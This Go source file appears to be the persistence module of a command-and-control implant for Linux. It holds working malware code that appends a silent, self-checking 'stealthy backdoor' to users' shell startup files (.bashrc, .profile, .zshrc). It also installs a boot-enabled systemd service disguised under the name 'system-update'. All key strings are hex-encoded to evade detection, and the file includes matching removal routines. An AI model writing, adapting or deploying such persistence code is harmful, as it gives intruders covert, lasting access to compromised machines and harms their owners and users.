// server/docker/payloads/Linux/action_persistence_linux.go

//go:build linux
// +build linux

package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"os/user"
	"path/filepath"
	"strings"

	"golang.org/x/sys/unix"
)

// PersistenceTemplate represents server-delivered template data
type PersistenceTemplate struct {
	Version   int               `json:"v"`
	Type      string            `json:"t"`
	Templates map[string]string `json:"tpl"`
	Params    map[string]string `json:"p"`
}

// Template keys (must match server-side constants)
const (
	tplUnitHeader     = "unit_header"
	tplDescPrefix     = "desc_prefix"
	tplServiceSuffix  = "service_suffix"
	tplAfterNetwork   = "after_network"
	tplWantsNetwork   = "wants_network"
	tplServiceHeader  = "service_header"
	tplTypeSimple     = "type_simple"
	tplRestartAlways  = "restart_always"
	tplRestartSec     = "restart_sec"
	tplExecStart      = "exec_start"
	tplStdOutNull     = "stdout_null"
	tplStdErrNull     = "stderr_null"
	tplSecComment     = "sec_comment"
	tplPrivateTmp     = "private_tmp"
	tplNoNewPrivs     = "no_new_privs"
	tplProtectSys     = "protect_sys"
	tplProtectHome    = "protect_home"
	tplReadWriteTmp   = "read_write_tmp"
	tplInstallHeader  = "install_header"
	tplWantedBy       = "wanted_by"
	tplBashIfSudo     = "bash_if_sudo"
	tplBashIfPgrep    = "bash_if_pgrep"
	tplBashPgrepEnd   = "bash_pgrep_end"
	tplBashNohup      = "bash_nohup"
	tplBashNohupEnd   = "bash_nohup_end"
	tplBashFi         = "bash_fi"
	tplBashEndFi      = "bash_end_fi"
)

// Persistence strings - only essential ones for dispatch/paths (templates now delivered server-side)
var (
	// Methods (needed for command dispatch)
	persistMethodBashrc  = string([]byte{0x62, 0x61, 0x73, 0x68, 0x72, 0x63})       // bashrc
	persistMethodSystemd = string([]byte{0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x64}) // systemd
	persistMethodCron    = string([]byte{0x63, 0x72, 0x6f, 0x6e})                   // cron
	persistMethodRemove  = string([]byte{0x72, 0x65, 0x6d, 0x6f, 0x76, 0x65})       // remove

	// Short flags (all transformed from user-friendly flags on server side)
	persistFlagRaw         = string([]byte{0x2d, 0x31})       // -1 (from --raw)
	persistFlagNoNohup     = string([]byte{0x2d, 0x32})       // -2 (from --no-nohup)
	persistFlagNoSilence   = string([]byte{0x2d, 0x33})       // -3 (from --no-silence)
	persistFlagNoPgrep     = string([]byte{0x2d, 0x34})       // -4 (from --no-pgrep)
	persistFlagNoSudoCheck = string([]byte{0x2d, 0x35})       // -5 (from --no-sudo-check)
	persistFlagCommand     = string([]byte{0x2d, 0x36})       // -6 (from --command)
	persistFlagFiles       = string([]byte{0x2d, 0x37})       // -7 (from --files)
	persistFlagFile        = string([]byte{0x2d, 0x38})       // -8 (from --file)
	persistFlagUser        = string([]byte{0x2d, 0x39})       // -9 (from --user)
	persistFlagName        = string([]byte{0x2d, 0x6e})       // -n (from --name)
	persistFlagAll         = string([]byte{0x2d, 0x61})       // -a (from --all)

	// Paths (needed for file operations)
	persistProcSelfExe = string([]byte{0x2f, 0x70, 0x72, 0x6f, 0x63, 0x2f, 0x73, 0x65, 0x6c, 0x66, 0x2f, 0x65, 0x78, 0x65})                                 // /proc/self/exe
	persistEtcSystemd  = string([]byte{0x2f, 0x65, 0x74, 0x63, 0x2f, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x64, 0x2f, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6d}) // /etc/systemd/system
	persistDotConfig   = string([]byte{0x2e, 0x63, 0x6f, 0x6e, 0x66, 0x69, 0x67})                                                                           // .config
	persistSystemdDir  = string([]byte{0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x64})                                                                           // systemd
	persistUserDir     = string([]byte{0x75, 0x73, 0x65, 0x72})                                                                                             // user
	persistServiceExt  = string([]byte{0x2e, 0x73, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65})                                                                     // .service

	// RC files (needed for default file list)
	persistBashrc      = string([]byte{0x2e, 0x62, 0x61, 0x73, 0x68, 0x72, 0x63})                                     // .bashrc
	persistProfile     = string([]byte{0x2e, 0x70, 0x72, 0x6f, 0x66, 0x69, 0x6c, 0x65})                               // .profile
	persistBashProfile = string([]byte{0x2e, 0x62, 0x61, 0x73, 0x68, 0x5f, 0x70, 0x72, 0x6f, 0x66, 0x69, 0x6c, 0x65}) // .bash_profile
	persistZshrc       = string([]byte{0x2e, 0x7a, 0x73, 0x68, 0x72, 0x63})                                           // .zshrc
	persistTildeSlash  = string([]byte{0x7e, 0x2f})                                                                   // ~/

	// Default service name
	persistDefaultSvc = string([]byte{0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x2d, 0x75, 0x70, 0x64, 0x61, 0x74, 0x65}) // system-update

	// Symlink directories (needed for enabling services)
	persistMultiUserTargetWants = string([]byte{0x6d, 0x75, 0x6c, 0x74, 0x69, 0x2d, 0x75, 0x73, 0x65, 0x72, 0x2e, 0x74, 0x61, 0x72, 0x67, 0x65, 0x74, 0x2e, 0x77, 0x61, 0x6e, 0x74, 0x73}) // multi-user.target.wants
	persistDefaultTargetWants   = string([]byte{0x64, 0x65, 0x66, 0x61, 0x75, 0x6c, 0x74, 0x2e, 0x74, 0x61, 0x72, 0x67, 0x65, 0x74, 0x2e, 0x77, 0x61, 0x6e, 0x74, 0x73})                   // default.target.wants

	// Kept for cleanup detection (used in cleanRCFile to find injected payload)
	persistBashIfSudo = string([]byte{0x69, 0x66, 0x20, 0x5b, 0x20, 0x2d, 0x7a, 0x20, 0x22, 0x24, 0x53, 0x55, 0x44, 0x4f, 0x5f, 0x43, 0x4f, 0x4d, 0x4d, 0x41, 0x4e, 0x44, 0x22, 0x20, 0x5d, 0x3b, 0x20, 0x74, 0x68, 0x65, 0x6e}) // if [ -z "$SUDO_COMMAND" ]; then

	// Misc
	persistAmpersand = string([]byte{0x20, 0x26}) //  &
)

// PersistenceCommand handles various persistence mechanisms
type PersistenceCommand struct{}

func (c *PersistenceCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if len(args) < 1 {
		return CommandResult{
			Output:   Err(E1),
			ExitCode: 1,
		}
	}

	// Parse template data from command if present
	var template *PersistenceTemplate
	if ctx.CurrentCommand != nil && ctx.CurrentCommand.Data != "" {
		if decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentCommand.Data); err == nil {
			template = &PersistenceTemplate{}
			if err := json.Unmarshal(decoded, template); err != nil {
				template = nil // Failed to parse, will use hardcoded fallback
			}
		}
	}

	method := args[0]
	switch method {
	case persistMethodBashrc:
		return c.handleBashrcPersistence(args[1:], template)
	case persistMethodSystemd:
		return c.handleSystemdPersistence(args[1:], template)
	case persistMethodCron:
		// Delegate to CronPersistenceCommand (cron methods: spool, crond, periodic, anacron, timer)
		cronCmd := &CronPersistenceCommand{}
		return cronCmd.Execute(ctx, args[1:])
	case persistMethodRemove:
		if len(args) < 2 {
			return CommandResult{
				Output:   Err(E1),
				ExitCode: 1,
			}
		}
		return c.removePersistence(args[1], args[2:])
	default:
		return CommandResult{
			Output:   ErrCtx(E21, method),
			ExitCode: 1,
		}
	}
}

// bashrcOptions holds payload generation options
type bashrcOptions struct {
	raw         bool // Just the command, no wrapping
	noNohup     bool // Skip nohup wrapper
	noSilence   bool // Don't redirect to /dev/null
	noPgrep     bool // Don't check if process already running
	noSudoCheck bool // Don't check SUDO_COMMAND
}

// handleBashrcPersistence adds backdoor to shell initialization files
func (c *PersistenceCommand) handleBashrcPersistence(args []string, template *PersistenceTemplate) CommandResult {
	var targetUser string
	var command string
	var targetFiles []string
	var allFiles bool
	var opts bashrcOptions

	// Parse arguments
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case persistFlagUser:
			if i+1 < len(args) {
				targetUser = args[i+1]
				i++
			}
		case persistFlagCommand:
			if i+1 < len(args) {
				command = args[i+1]
				i++
			}
		case persistFlagFile:
			if i+1 < len(args) {
				targetFiles = append(targetFiles, args[i+1])
				i++
			}
		case persistFlagFiles:
			if i+1 < len(args) {
				// Parse comma-separated list
				files := strings.Split(args[i+1], ",")
				for _, f := range files {
					targetFiles = append(targetFiles, strings.TrimSpace(f))
				}
				i++
			}
		case persistFlagAll:
			allFiles = true
		case persistFlagRaw:
			opts.raw = true
		case persistFlagNoNohup:
			opts.noNohup = true
		case persistFlagNoSilence:
			opts.noSilence = true
		case persistFlagNoPgrep:
			opts.noPgrep = true
		case persistFlagNoSudoCheck:
			opts.noSudoCheck = true
		}
	}

	// Default to current user
	if targetUser == "" {
		currentUser, err := user.Current()
		if err != nil {
			return CommandResult{
				Output:   Err(E19),
				ExitCode: 1,
			}
		}
		targetUser = currentUser.Username
	}

	// Default command (current binary path)
	if command == "" {
		execPath, err := os.Readlink(persistProcSelfExe)
		if err != nil {
			execPath = os.Args[0]
		}
		command = execPath + persistAmpersand
	}

	// Get user info
	u, err := user.Lookup(targetUser)
	if err != nil {
		return CommandResult{
			Output:   ErrCtx(E4, targetUser),
			ExitCode: 1,
		}
	}

	// Determine target files based on flags
	if allFiles {
		// --all: target all common RC files
		targetFiles = []string{
			filepath.Join(u.HomeDir, persistBashrc),
			filepath.Join(u.HomeDir, persistProfile),
			filepath.Join(u.HomeDir, persistBashProfile),
			filepath.Join(u.HomeDir, persistZshrc),
		}
	} else if len(targetFiles) == 0 {
		// No files specified: default to only .bashrc
		targetFiles = []string{
			filepath.Join(u.HomeDir, persistBashrc),
		}
	} else {
		// Expand paths for specified files
		for i, file := range targetFiles {
			// Handle relative paths and ~ expansion
			if strings.HasPrefix(file, persistTildeSlash) {
				targetFiles[i] = filepath.Join(u.HomeDir, file[2:])
			} else if !filepath.IsAbs(file) {
				// If not absolute, assume it's in user's home
				targetFiles[i] = filepath.Join(u.HomeDir, file)
			}
		}
	}

	var results []string

	// Generate backdoor payload using server-provided template
	backdoorPayload := c.generateBashrcPayload(command, template, opts)
	if backdoorPayload == "" {
		return CommandResult{
			Output:   Err(E18), // Template data required from server
			ExitCode: 1,
		}
	}

	for _, file := range targetFiles {
		if err := c.injectIntoRCFile(file, backdoorPayload); err != nil {
			results = append(results, ErrCtx(E11, file))
		} else {
			results = append(results, SuccCtx(S1, file))
		}
	}

	return CommandResult{
		Output:   strings.Join(results, "\n"),
		ExitCode: 0,
	}
}

// generateBashrcPayload creates a stealthy backdoor payload using server-provided templates
func (c *PersistenceCommand) generateBashrcPayload(command string, template *PersistenceTemplate, opts bashrcOptions) string {
	// If --raw is specified, just return the command itself
	if opts.raw {
		return "\n" + command + "\n"
	}

	// Template is required - templates are now delivered server-side
	if template == nil || template.Templates == nil {
		return "" // Will cause error in caller
	}

	// Helper to get template value (required)
	getVal := func(key string) string {
		if val, ok := template.Templates[key]; ok {
			return val
		}
		return ""
	}

	// Build payload based on options
	var payload strings.Builder
	payload.WriteString("\n")

	// Track indentation level based on what wrappers are active
	indent := ""

	// Start SUDO_COMMAND check (unless --no-sudo-check)
	if !opts.noSudoCheck {
		payload.WriteString(getVal(tplBashIfSudo))
		payload.WriteString("\n")
		indent = "    "
	}

	// Start pgrep check (unless --no-pgrep)
	if !opts.noPgrep {
		payload.WriteString(indent)
		payload.WriteString(getVal(tplBashIfPgrep))
		payload.WriteString(command)
		payload.WriteString(getVal(tplBashPgrepEnd))
		payload.WriteString("\n")
		indent += "    "
	}

	// Write the command execution line
	payload.WriteString(indent)
	if opts.noNohup && opts.noSilence {
		// Just the command with background
		payload.WriteString(command)
		payload.WriteString(" &")
	} else if opts.noNohup {
		// No nohup but still silence output
		payload.WriteString("(")
		payload.WriteString(command)
		payload.WriteString(" > /dev/null 2>&1 &) 2>/dev/null")
	} else if opts.noSilence {
		// Use nohup but don't redirect to /dev/null
		payload.WriteString("(nohup ")
		payload.WriteString(command)
		payload.WriteString(" &) 2>/dev/null")
	} else {
		// Full wrapping: nohup + silence (default)
		payload.WriteString(getVal(tplBashNohup))
		payload.WriteString(command)
		payload.WriteString(getVal(tplBashNohupEnd))
	}
	payload.WriteString("\n")

	// Close pgrep check (unless --no-pgrep)
	if !opts.noPgrep {
		if !opts.noSudoCheck {
			payload.WriteString("    ")
		}
		payload.WriteString(getVal(tplBashFi))
		payload.WriteString("\n")
	}

	// Close SUDO_COMMAND check (unless --no-sudo-check)
	if !opts.noSudoCheck {
		payload.WriteString(getVal(tplBashEndFi))
	}

	return payload.String()
}

// injectIntoRCFile adds backdoor to RC file using direct file operations
func (c *PersistenceCommand) injectIntoRCFile(filepath string, payload string) error {
	// Check if file exists
	info, err := os.Stat(filepath)
	if err != nil {
		if os.IsNotExist(err) {
			// Create file if it doesn't exist
			return os.WriteFile(filepath, []byte(payload), 0644)
		}
		return err
	}

	// Read existing content
	content, err := os.ReadFile(filepath)
	if err != nil {
		return err
	}

	// Check if command is already in file (avoid duplicates without marker)
	// Extract the command from the payload for checking
	if bytes.Contains(content, []byte(payload)) {
		return fmt.Errorf(Err(E5))
	}

	// Append payload
	newContent := append(content, []byte("\n"+payload)...)

	// Write back with original permissions
	return os.WriteFile(filepath, newContent, info.Mode())
}

// handleSystemdPersistence installs systemd service
func (c *PersistenceCommand) handleSystemdPersistence(args []string, template *PersistenceTemplate) CommandResult {
	var serviceName string
	var userService bool

	// Parse arguments
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case persistFlagName:
			if i+1 < len(args) {
				serviceName = args[i+1]
				i++
			}
		case persistFlagUser:
			userService = true
		}
	}

	// Default service name
	if serviceName == "" {
		serviceName = persistDefaultSvc
	}

	// Get current binary path
	execPath, err := os.Readlink(persistProcSelfExe)
	if err != nil {
		execPath = os.Args[0]
	}

	if userService {
		return c.installUserSystemdService(serviceName, execPath, template)
	}
	return c.installSystemSystemdService(serviceName, execPath, template)
}

// installUserSystemdService creates user-level systemd service
func (c *PersistenceCommand) installUserSystemdService(name string, execPath string, template *PersistenceTemplate) CommandResult {
	// Get current user
	currentUser, err := user.Current()
	if err != nil {
		return CommandResult{
			Output:   Err(E19),
			ExitCode: 1,
		}
	}

	// User systemd directory
	systemdDir := filepath.Join(currentUser.HomeDir, persistDotConfig, persistSystemdDir, persistUserDir)

	// Create directory structure
	if err := os.MkdirAll(systemdDir, 0755); err != nil {
		return CommandResult{
			Output:   ErrCtx(E11, systemdDir),
			ExitCode: 1,
		}
	}

	// Service file path
	serviceFile := filepath.Join(systemdDir, name+persistServiceExt)

	// Generate service content using server-provided template
	serviceContent := c.generateSystemdService(name, execPath, true, template)
	if serviceContent == "" {
		return CommandResult{
			Output:   Err(E18), // Template data required from server
			ExitCode: 1,
		}
	}

	// Write service file
	if err := os.WriteFile(serviceFile, []byte(serviceContent), 0644); err != nil {
		return CommandResult{
			Output:   ErrCtx(E11, serviceFile),
			ExitCode: 1,
		}
	}

	// Enable service using DBus API (if available) or fallback
	if err := c.enableSystemdService(name, true); err != nil {
		// Service created but not auto-enabled
		return CommandResult{
			Output:   SuccCtx(S1, serviceFile),
			ExitCode: 0,
		}
	}

	return CommandResult{
		Output:   SuccCtx(S1, serviceFile),
		ExitCode: 0,
	}
}

// installSystemSystemdService creates system-level systemd service
func (c *PersistenceCommand) installSystemSystemdService(name string, execPath string, template *PersistenceTemplate) CommandResult {
	// System systemd directory
	systemdDir := persistEtcSystemd

	// Check if we have write access using unix.Access
	if unix.Access(systemdDir, unix.W_OK) != nil {
		return CommandResult{
			Output:   ErrCtx(E3, systemdDir),
			ExitCode: 1,
		}
	}

	// Service file path
	serviceFile := filepath.Join(systemdDir, name+persistServiceExt)

	// Generate service content using server-provided template
	serviceContent := c.generateSystemdService(name, execPath, false, template)
	if serviceContent == "" {
		return CommandResult{
			Output:   Err(E18), // Template data required from server
			ExitCode: 1,
		}
	}

	// Write service file
	if err := os.WriteFile(serviceFile, []byte(serviceContent), 0644); err != nil {
		return CommandResult{
			Output:   ErrCtx(E11, serviceFile),
			ExitCode: 1,
		}
	}

	// Create symlink for multi-user.target.wants to enable on boot
	wantsDir := filepath.Join(systemdDir, persistMultiUserTargetWants)
	if err := os.MkdirAll(wantsDir, 0755); err == nil {
		linkPath := filepath.Join(wantsDir, name+persistServiceExt)
		os.Symlink(serviceFile, linkPath)
	}

	return CommandResult{
		Output:   SuccCtx(S1, serviceFile),
		ExitCode: 0,
	}
}

// generateSystemdService creates systemd service configuration using server-provided templates
func (c *PersistenceCommand) generateSystemdService(name, execPath string, userService bool, template *PersistenceTemplate) string {
	// Template is required - templates are now delivered server-side
	if template == nil || template.Templates == nil {
		return "" // Will cause error in caller
	}

	// Helper to get template value (required)
	getVal := func(key string) string {
		if val, ok := template.Templates[key]; ok {
			return val
		}
		return ""
	}

	// Helper to get param value with default
	getParam := func(key, defaultVal string) string {
		if template.Params != nil {
			if val, ok := template.Params[key]; ok && val != "" {
				return val
			}
		}
		return defaultVal
	}

	// Get description and target from template params
	description := getParam("description", "")
	target := getParam("target", "")

	// Build service file content using server-provided template values
	var svc strings.Builder
	svc.WriteString(getVal(tplUnitHeader))
	svc.WriteString("\n")
	svc.WriteString(getVal(tplDescPrefix))
	svc.WriteString(description)
	svc.WriteString(getVal(tplServiceSuffix))
	svc.WriteString("\n")
	svc.WriteString(getVal(tplAfterNetwork))
	svc.WriteString("\n")
	svc.WriteString(getVal(tplWantsNetwork))
	svc.WriteString("\n\n")
	svc.WriteString(getVal(tplServiceHeader))
	svc.WriteString("\n")
	svc.WriteString(getVal(tplTypeSimple))
	svc.WriteString("\n")
	svc.WriteString(getVal(tplRestartAlways))
	svc.WriteString("\n")
	svc.WriteString(getVal(tplRestartSec))
	svc.WriteString("\n")
	svc.WriteString(getVal(tplExecStart))
	svc.WriteString(execPath)
	svc.WriteString("\n")
	svc.WriteString(getVal(tplStdOutNull))
	svc.WriteString("\n")
	svc.WriteString(getVal(tplStdErrNull))
	svc.WriteString("\n\n")
	svc.WriteString(getVal(tplSecComment))
	svc.WriteString("\n")
	svc.WriteString(getVal(tplPrivateTmp))
	svc.WriteString("\n")
	svc.WriteString(getVal(tplNoNewPrivs))
	svc.WriteString("\n")
	svc.WriteString(getVal(tplProtectSys))
	svc.WriteString("\n")
	svc.WriteString(getVal(tplProtectHome))
	svc.WriteString("\n")
	svc.WriteString(getVal(tplReadWriteTmp))
	svc.WriteString("\n\n")
	svc.WriteString(getVal(tplInstallHeader))
	svc.WriteString("\n")
	svc.WriteString(getVal(tplWantedBy))
	svc.WriteString(target)
	svc.WriteString("\n")

	return svc.String()
}

// enableSystemdService attempts to enable service via systemd
func (c *PersistenceCommand) enableSystemdService(name string, userService bool) error {
	// Try to reload systemd daemon
	if userService {
		// For user services, create a symlink in wants directory
		currentUser, err := user.Current()
		if err != nil {
			return err
		}

		wantsDir := filepath.Join(currentUser.HomeDir, persistDotConfig, persistSystemdDir, persistUserDir, persistDefaultTargetWants)
		if err := os.MkdirAll(wantsDir, 0755); err != nil {
			return err
		}

		serviceFile := filepath.Join(currentUser.HomeDir, persistDotConfig, persistSystemdDir, persistUserDir, name+persistServiceExt)
		linkPath := filepath.Join(wantsDir, name+persistServiceExt)

		return os.Symlink(serviceFile, linkPath)
	}

	// System service is handled by symlink creation in install function
	return nil
}

// removePersistence removes installed persistence
func (c *PersistenceCommand) removePersistence(method string, args []string) CommandResult {
	switch method {
	case persistMethodBashrc:
		return c.removeBashrcPersistence()
	case persistMethodSystemd:
		var serviceName string
		for i := 0; i < len(args); i++ {
			if args[i] == persistFlagName && i+1 < len(args) {
				serviceName = args[i+1]
			}
		}
		if serviceName == "" {
			serviceName = persistDefaultSvc
		}
		return c.removeSystemdPersistence(serviceName)
	default:
		return CommandResult{
			Output:   ErrCtx(E21, method),
			ExitCode: 1,
		}
	}
}

// removeBashrcPersistence removes backdoors from RC files
func (c *PersistenceCommand) removeBashrcPersistence() CommandResult {
	currentUser, err := user.Current()
	if err != nil {
		return CommandResult{
			Output:   Err(E19),
			ExitCode: 1,
		}
	}

	targetFiles := []string{
		filepath.Join(currentUser.HomeDir, persistBashrc),
		filepath.Join(currentUser.HomeDir, persistProfile),
		filepath.Join(currentUser.HomeDir, persistBashProfile),
		filepath.Join(currentUser.HomeDir, persistZshrc),
	}

	var results []string

	for _, file := range targetFiles {
		if err := c.cleanRCFile(file); err != nil {
			if !os.IsNotExist(err) {
				results = append(results, ErrCtx(E11, file))
			}
		} else {
			results = append(results, SuccCtx(S2, file))
		}
	}

	return CommandResult{
		Output:   strings.Join(results, "\n"),
		ExitCode: 0,
	}
}

// cleanRCFile removes backdoor from RC file
func (c *PersistenceCommand) cleanRCFile(filePath string) error {
	content, err := os.ReadFile(filePath)
	if err != nil {
		return err
	}

	// Split into lines
	lines := strings.Split(string(content), "\n")
	var cleanedLines []string
	skipNext := 0

	for i := 0; i < len(lines); i++ {
		line := lines[i]

		// Look for our backdoor pattern (checking for the if statement structure)
		if strings.Contains(line, persistBashIfSudo) {
			// Found start of our backdoor, skip next 4 lines (the full backdoor block)
			skipNext = 4
			continue
		}

		if skipNext > 0 {
			skipNext--
			continue
		}

		cleanedLines = append(cleanedLines, line)
	}

	// Remove any trailing empty lines we might have added
	for len(cleanedLines) > 0 && cleanedLines[len(cleanedLines)-1] == "" {
		cleanedLines = cleanedLines[:len(cleanedLines)-1]
	}

	// Write back cleaned content
	return os.WriteFile(filePath, []byte(strings.Join(cleanedLines, "\n")), 0644)
}

// removeSystemdPersistence removes systemd service
func (c *PersistenceCommand) removeSystemdPersistence(name string) CommandResult {
	var results []string

	// Try to remove user service
	currentUser, err := user.Current()
	if err == nil {
		userServiceFile := filepath.Join(currentUser.HomeDir, persistDotConfig, persistSystemdDir, persistUserDir, name+persistServiceExt)
		userLinkPath := filepath.Join(currentUser.HomeDir, persistDotConfig, persistSystemdDir, persistUserDir, persistDefaultTargetWants, name+persistServiceExt)

		if err := os.Remove(userServiceFile); err == nil {
			results = append(results, SuccCtx(S2, userServiceFile))
		}
		os.Remove(userLinkPath)
	}

	// Try to remove system service (if we have permissions)
	systemServiceFile := filepath.Join(persistEtcSystemd, name+persistServiceExt)
	systemLinkPath := filepath.Join(persistEtcSystemd, persistMultiUserTargetWants, name+persistServiceExt)

	if err := os.Remove(systemServiceFile); err == nil {
		results = append(results, SuccCtx(S2, systemServiceFile))
	}
	os.Remove(systemLinkPath)

	if len(results) == 0 {
		return CommandResult{
			Output:   ErrCtx(E4, name),
			ExitCode: 1,
		}
	}

	return CommandResult{
		Output:   strings.Join(results, "\n"),
		ExitCode: 0,
	}
}
